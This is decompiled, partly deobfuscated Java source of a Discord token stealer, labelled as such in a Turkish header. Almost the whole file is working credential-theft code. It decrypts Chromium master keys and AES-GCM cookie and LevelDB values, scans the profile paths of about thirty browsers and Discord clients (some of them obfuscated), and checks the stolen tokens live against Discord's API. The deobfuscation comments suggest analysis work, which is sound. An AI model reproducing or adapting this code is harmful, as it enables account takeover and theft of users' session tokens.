/*\n * ========================================\n * DEOBFUSCATED: TokenStealer.java\n * Original: d/p.java\n * ----------------------------------------\n * Discord token hırsızı - 30+ browser + Discord client tokenları çalar (516 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import c.c;
import c.r;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.Key;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

public class p {
    private static final LinkedHashMap<String, String> a = new LinkedHashMap();
    private static final Set<String> b = new HashSet<String>();
    private static final Pattern TOKEN_PATTERN = Pattern.compile("[\\w-]{24,27}\\.[\\w-]{6,7}\\.[\\w-]{25,110}");
    private static final Pattern MFA_PATTERN = Pattern.compile("dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\"]*");

    private static boolean isChromium(String path) {
        String string2 = string == null ? "" : string.toLowerCase(Locale.ROOT);
        return string2.contains("discord") || string2.contains("lightcord");
    }

    private static boolean isFirefox(String path) {
        return string != null && string.toLowerCase(Locale.ROOT).contains("firefox");
    }

    private static byte[] extractMasterKey(String dataDir) {
        File file = new File(string, "Local State" /* r.ls() */);
        if (!file.exists()) {
            return null;
        }
        try {
            String string2 = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
            JSONObject jSONObject = new JSONObject(string2);
            String string3 = jSONObject.getJSONObject("os_crypt" /* r.osc() */).optString("encrypted_key" /* r.ek() */, null);
            if (string3 == null || string3.isEmpty()) {
                return null;
            }
            byte[] byArray = Base64.getDecoder().decode(string3);
            byte[] byArray2 = Arrays.copyOfRange(byArray, 5, byArray.length);
            return Crypt32Util.cryptUnprotectData(byArray2);
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String decryptDbToken(String dbPath, byte[] key) {
        try {
            String string2 = string.split("dQw4w9WgXcQ:")[1];
            byte[] byArray2 = Base64.getDecoder().decode(string2);
            byte[] byArray3 = new byte[12];
            byte[] byArray4 = new byte[byArray2.length - 15];
            System.arraycopy(byArray2, 3, byArray3, 0, 12);
            System.arraycopy(byArray2, 15, byArray4, 0, byArray2.length - 15);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec secretKeySpec = new SecretKeySpec(byArray, "AES");
            GCMParameterSpec gCMParameterSpec = new GCMParameterSpec(128, byArray3);
            cipher.init(2, (Key)secretKeySpec, gCMParameterSpec);
            byte[] byArray5 = cipher.doFinal(byArray4);
            return new String(byArray5, StandardCharsets.UTF_8).trim();
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static List<String> scanLevelDb(String dir, boolean isFirefox, byte[] key) {
        ArrayList<String> arrayList = new ArrayList<String>();
        File file = new File(string);
        if (!file.exists() || !file.isDirectory()) {
            return arrayList;
        }
        try (Stream<Path> stream = Files.walk(file.toPath(), new FileVisitOption[0]);){
            stream.filter(p::lambda$inspectStore$0).forEach(arg_0 -> p.lambda$inspectStore$1(bl, byArray, arrayList, arg_0));
        }
        catch (Exception exception) {
            // empty catch block
        }
        return arrayList;
    }

    private static List<String> scanFirefoxDb(String profileDir) {
        ArrayList<String> arrayList = new ArrayList<String>();
        File file = new File(string);
        if (!file.exists() || !file.isDirectory()) {
            return arrayList;
        }
        try (Stream<Path> stream = Files.walk(file.toPath(), new FileVisitOption[0]);){
            stream.filter(p::lambda$inspectFirefoxStore$0).forEach(arg_0 -> p.lambda$inspectFirefoxStore$1(arrayList, arg_0));
        }
        catch (Exception exception) {
            // empty catch block
        }
        return arrayList;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static List<String> extractCookieTokens(String dataDir) {
        Object object;
        Object object2;
        Object object3;
        ArrayList<String> arrayList = new ArrayList<String>();
        File file = new File(string);
        if (!file.exists() || !file.isDirectory()) {
            return arrayList;
        }
        byte[] byArray = p.c(string);
        File file2 = file.getParentFile();
        if (byArray == null && file2 != null) {
            byArray = p.c(file2.getAbsolutePath());
        }
        ArrayList<File> arrayList2 = new ArrayList<File>();
        File file3 = new File(file, "Network\\Cookies" /* r.nck() */);
        if (file3.isFile()) {
            arrayList2.add(file3);
            if (byArray == null) {
                byArray = p.c(file.getParent());
            }
        } else {
            object3 = file.listFiles();
            if (object3 != null) {
                for (File file4 : object3) {
                    object2 = file4.getName();
                    object = new File(file4, "Network\\Cookies" /* r.nck() */);
                    if (!file4.isDirectory() || !((String)object2).equals("Default") && !((String)object2).startsWith("Profile") && !((String)object2).equals("Guest Profile") || !((File)object).isFile()) continue;
                    arrayList2.add((File)object);
                }
            }
        }
        if (byArray == null) {
            return arrayList;
        }
        object3 = arrayList2.iterator();
        block31: while (object3.hasNext()) {
            File file5 = (File)object3.next();
            File file6 = null;
            try {
                file6 = File.createTempFile("sp_ck_", ".db");
                file6.deleteOnExit();
                try {
                    Files.copy(file5.toPath(), file6.toPath(), StandardCopyOption.REPLACE_EXISTING);
                }
                catch (Exception exception) {
                    file6 = file5;
                }
                String string2 = "jdbc:sqlite:" /* r.sq() */ + file6.getAbsolutePath();
                String string3 = "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'";
                object2 = DriverManager.getConnection(string2);
                try {
                    object = object2.createStatement();
                    try {
                        ResultSet resultSet = object.executeQuery(string3);
                        try {
                            while (true) {
                                if (!resultSet.next()) continue block31;
                                try {
                                    String string4;
                                    byte[] byArray2 = resultSet.getBytes("encrypted_value");
                                    if (byArray2 == null || byArray2.length <= 0 || (string4 = p.a(byArray2, byArray)) == null || !c.matcher(string4).matches()) continue;
                                    arrayList.add(string4);
                                }
                                catch (Exception exception) {}
                            }
                        }
                        finally {
                            if (resultSet == null) continue;
                            resultSet.close();
                        }
                    }
                    finally {
                        if (object == null) continue;
                        object.close();
                    }
                }
                finally {
                    if (object2 == null) continue;
                    object2.close();
                }
            }
            catch (Exception exception) {}
            finally {
                if (file6 != null && file6 != file5) {
                    try {
                        file6.delete();
                    }
                    catch (Exception exception2) {}
                }
            }
        }
        return arrayList;
    }

    private static String decryptValue(byte[] encrypted, byte[] key) {
        try {
            if (byArray.length > 3 && byArray[0] == 118 && byArray[1] == 49 && byArray[2] == 48) {
                byte[] byArray3 = Arrays.copyOfRange(byArray, 3, 15);
                byte[] byArray4 = Arrays.copyOfRange(byArray, 15, byArray.length);
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(2, (Key)new SecretKeySpec(byArray2, "AES"), new GCMParameterSpec(128, byArray3));
                return new String(cipher.doFinal(byArray4), StandardCharsets.UTF_8).trim();
            }
            if (byArray.length > 3 && byArray[0] == 118 && byArray[1] == 50 && byArray[2] == 48) {
                byte[] byArray5 = Arrays.copyOfRange(byArray, 3, 15);
                byte[] byArray6 = Arrays.copyOfRange(byArray, 15, byArray.length);
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(2, (Key)new SecretKeySpec(byArray2, "AES"), new GCMParameterSpec(128, byArray5));
                return new String(cipher.doFinal(byArray6), StandardCharsets.UTF_8).trim();
            }
            byte[] byArray7 = Crypt32Util.cryptUnprotectData(byArray);
            return new String(byArray7, StandardCharsets.UTF_8).trim();
        }
        catch (Exception exception) {
            try {
                byte[] byArray8 = Crypt32Util.cryptUnprotectData(byArray);
                return new String(byArray8, StandardCharsets.UTF_8).trim();
            }
            catch (Exception exception2) {
                return null;
            }
        }
    }

    private static List<String> findTokensInText(String path, String text) {
        ArrayList<String> arrayList = new ArrayList<String>();
        if (string2 == null || string2.isEmpty() || !new File(string2).exists()) {
            return arrayList;
        }
        if (p.b(string)) {
            arrayList.addAll(p.d(string2));
            return arrayList;
        }
        byte[] byArray = p.c(string2);
        arrayList.addAll(p.a(string2, true, byArray));
        arrayList.addAll(p.a(string2, false, null));
        arrayList.addAll(p.e(string2));
        return arrayList;
    }

    private static boolean isValidToken(String token) {
        if (string == null || string.isEmpty() || !c.matcher(string).matches()) {
            return false;
        }
        try {
            URL uRL = new URL("https://discord.com/api/v10/users/@me");
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Authorization", string);
            httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            httpURLConnection.setConnectTimeout(3000);
            httpURLConnection.setReadTimeout(3000);
            int n2 = httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
            return n2 == 200;
        }
        catch (Exception exception) {
            return false;
        }
    }

    private static boolean validateTokenOnline(String token) {
        if (p.f(string)) {
            return true;
        }
        try {
            Thread.sleep(400L);
        }
        catch (InterruptedException interruptedException) {
            // empty catch block
        }
        if (p.f(string)) {
            return true;
        }
        try {
            Thread.sleep(600L);
        }
        catch (InterruptedException interruptedException) {
            // empty catch block
        }
        return p.f(string);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static void refreshTokenCache() {
        Set<String> set = b;
        synchronized (set) {
            b.clear();
        }
    }

    public static List<String> scanAllBrowsers() {
        LinkedHashSet<String> linkedHashSet = new LinkedHashSet<String>();
        for (Map.Entry<String, String> entry : a.entrySet()) {
            String string = entry.getKey();
            String string2 = entry.getValue();
            try {
                List<String> list = p.a(string, string2);
                int n2 = linkedHashSet.size();
                for (String string3 : list) {
                    String string4;
                    if (string3 == null || (string4 = string3.trim()).isEmpty() || !c.matcher(string4).matches()) continue;
                    linkedHashSet.add(string4);
                }
                int n3 = linkedHashSet.size() - n2;
                if (n3 <= 0) continue;
                try {
                    c.c.logEvent("token source " + string + " +" + n3 + (p.a(string) ? " (discord)" : " (browser)"));
                }
                catch (Throwable throwable) {
                }
            }
            catch (Throwable throwable) {
                try {
                    c.c.logEvent("token source fail " + string + ": " + throwable.getMessage());
                }
                catch (Throwable throwable2) {}
            }
        }
        return new ArrayList<String>(linkedHashSet);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static List<String> validateTokens(List<String> tokens, boolean strict) {
        ArrayList<String> arrayList = new ArrayList<String>();
        if (list == null) {
            return arrayList;
        }
        for (String string : list) {
            String string2 = string == null ? null : string.trim();
            if (string2 == null || string2.isEmpty() || !c.matcher(string2).matches()) continue;
            Set<String> set = b;
            synchronized (set) {
                if (!bl && b.contains(string2)) {
                    continue;
                }
            }
            if (p.g(string2)) {
                set = b;
                synchronized (set) {
                    b.add(string2);
                }
                arrayList.add(string2);
                continue;
            }
            if (!bl) continue;
            set = b;
            synchronized (set) {
                b.add(string2);
            }
        }
        return arrayList;
    }

    public static List<String> getValidTokens() {
        return p.a(false);
    }

    public static List<String> collectTokens(boolean refresh) {
        return p.a(p.b(), bl);
    }

    public static String getFirstValidToken() {
        List<String> list = p.c();
        return list.isEmpty() ? null : list.get(0);
    }

    private static void lambda$inspectFirefoxStore$1(List list, Path path) {
        try {
            String string = new String(Files.readAllBytes(path), StandardCharsets.ISO_8859_1);
            if (!string.toLowerCase(Locale.ROOT).contains("discord")) {
                return;
            }
            Matcher matcher = c.matcher(string);
            while (matcher.find()) {
                String string2 = matcher.group().replace("\\", "").trim();
                if (string2.isEmpty()) continue;
                list.add(string2);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static boolean lambda$inspectFirefoxStore$0(Path path) {
        Path path2 = path.getFileName();
        if (path2 == null) {
            return false;
        }
        String string = path2.toString().toLowerCase(Locale.ROOT);
        return string.endsWith(".sqlite") && (string.contains("webappsstore") || string.contains("cookies" /* r.ck() */));
    }

    private static void lambda$inspectStore$1(boolean bl, byte[] byArray, List list, Path path) {
        File file = path.toFile();
        File[] fileArray = file.listFiles();
        if (fileArray == null) {
            return;
        }
        for (File file2 : fileArray) {
            String string = file2.getName();
            if (!string.endsWith(".ldb") && !string.endsWith(".log")) continue;
            try {
                String string2;
                Matcher matcher;
                byte[] byArray2 = Files.readAllBytes(file2.toPath());
                String string3 = new String(byArray2, StandardCharsets.ISO_8859_1);
                if (bl) {
                    if (!string3.contains("dQw4w9WgXcQ:") || byArray == null) continue;
                    matcher = d.matcher(string3);
                    while (matcher.find()) {
                        string2 = matcher.group().replaceAll("\\\\$", "");
                        String string4 = p.a(string2, byArray);
                        if (string4 == null || !c.matcher(string4).matches()) continue;
                        list.add(string4);
                    }
                    continue;
                }
                matcher = c.matcher(string3);
                while (matcher.find()) {
                    string2 = matcher.group().replace("\\", "").trim();
                    if (string2.isEmpty()) continue;
                    list.add(string2);
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static boolean lambda$inspectStore$0(Path path) {
        Path path2 = path.getFileName();
        return path2 != null && path2.toString().equals("leveldb");
    }

    static {
        String string = System.getenv("APPDATA");
        String string2 = System.getenv("LOCALAPPDATA");
        if (string == null) {
            string = "";
        }
        if (string2 == null) {
            string2 = "";
        }
        a.put("Chrome", string2 + "\\Google\\Chrome" /* r.gc() */ + "\\User Data" /* r.ud() */);
        a.put("Edge", string2 + "\\Microsoft\\Edge" /* r.me() */ + "\\User Data" /* r.ud() */);
        a.put("Brave", string2 + "\\BraveSoftware\\Brave-Browser" /* r.bb() */ + "\\User Data" /* r.ud() */);
        a.put("Vivaldi", string2 + r.path(new int[]{19, 25, 38, 57, 46, 35, 43, 38}, 79) + "\\User Data" /* r.ud() */);
        a.put("Yandex", string2 + r.path(new int[]{13, 8, 48, 63, 53, 52, 41, 13, 8, 48, 63, 53, 52, 41, 19, 35, 62, 38, 34, 52, 35}, 81) + "\\User Data" /* r.ud() */);
        a.put("Chromium", string2 + "\\Chromium" /* r.ch() */ + "\\User Data" /* r.ud() */);
        a.put("Amigo", string2 + r.path(new int[]{15, 18, 62, 58, 52, 60}, 83) + "\\User Data" /* r.ud() */);
        a.put("Blisk", string2 + r.path(new int[]{7, 25, 55, 50, 40, 48}, 91) + "\\User Data" /* r.ud() */);
        a.put("Iridium", string2 + r.path(new int[]{1, 20, 47, 52, 57, 52, 40, 48}, 93) + "\\User Data" /* r.ud() */);
        a.put("CentBrowser", string2 + r.path(new int[]{3, 28, 58, 49, 43, 29, 45, 48, 40, 44, 58, 45}, 95) + "\\User Data" /* r.ud() */);
        a.put("Epic", string2 + r.path(new int[]{61, 36, 17, 8, 2, 65, 49, 19, 8, 23, 0, 2, 24, 65, 35, 19, 14, 22, 18, 4, 19}, 97) + "\\User Data" /* r.ud() */);
        a.put("Thorium", string2 + r.path(new int[]{63, 55, 11, 12, 17, 10, 22, 14}, 99) + "\\User Data" /* r.ud() */);
        a.put("Helium", string2 + r.path(new int[]{57, 12, 8, 21, 16, 17, 57, 45, 0, 9, 12, 16, 8}, 101) + "\\User Data" /* r.ud() */);
        a.put("Opera", string + "\\Opera Software\\Opera Stable" /* r.os() */);
        a.put("OperaGX", string + r.path(new int[]{25, 10, 53, 32, 55, 36, 101, 22, 42, 35, 49, 50, 36, 55, 32, 25, 10, 53, 32, 55, 36, 101, 2, 29, 101, 22, 49, 36, 39, 41, 32}, 69));
        a.put("Opera Crypto", string + r.path(new int[]{27, 8, 55, 34, 53, 38, 103, 20, 40, 33, 51, 48, 38, 53, 34, 27, 8, 55, 34, 53, 38, 103, 4, 53, 62, 55, 51, 40, 103, 20, 51, 38, 37, 43, 34}, 71));
        a.put("Opera Developer", string + r.path(new int[]{21, 6, 57, 44, 59, 40, 105, 26, 38, 47, 61, 62, 40, 59, 44, 21, 6, 57, 44, 59, 40, 105, 13, 44, 63, 44, 37, 38, 57, 44, 59}, 73));
        a.put("Opera Beta", string + r.path(new int[]{23, 4, 59, 46, 57, 42, 107, 24, 36, 45, 63, 60, 42, 57, 46, 23, 4, 59, 46, 57, 42, 107, 5, 46, 51, 63}, 75));
        a.put("Opera One", string + r.path(new int[]{17, 2, 61, 40, 63, 44, 109, 30, 34, 43, 57, 58, 44, 63, 40, 17, 2, 61, 40, 63, 44, 109, 2, 35, 40}, 77));
        a.put("Arc", string2 + r.path(new int[]{221, 213, 233, 228, 161, 195, 243, 238, 246, 242, 228, 243, 161, 194, 238, 236, 241, 224, 239, 248, 221, 192, 243, 226}, 129) + "\\User Data" /* r.ud() */);
        a.put("Firefox", string + "\\Mozilla\\Firefox\\Profiles" /* r.mfp() */);
        a.put("Floorp", string + r.path(new int[]{213, 207, 229, 230, 230, 251, 249, 213, 217, 251, 230, 239, 224, 229, 236, 250}, 137));
        a.put("LibreWolf", string + r.path(new int[]{215, 199, 226, 233, 249, 238, 220, 228, 231, 237, 215, 219, 249, 228, 237, 226, 231, 238, 248}, 139));
        a.put("Waterfox", string + r.path(new int[]{223, 212, 226, 247, 230, 241, 229, 236, 251, 223, 211, 241, 236, 229, 234, 239, 230, 240}, 131));
        a.put("Discord", string + "\\discord");
        a.put("Discord Canary", string + "\\discordcanary");
        a.put("Discord PTB", string + "\\discordptb");
        a.put("Discord Development", string + "\\discorddevelopment");
        a.put("Lightcord", string + "\\Lightcord");
    }
}

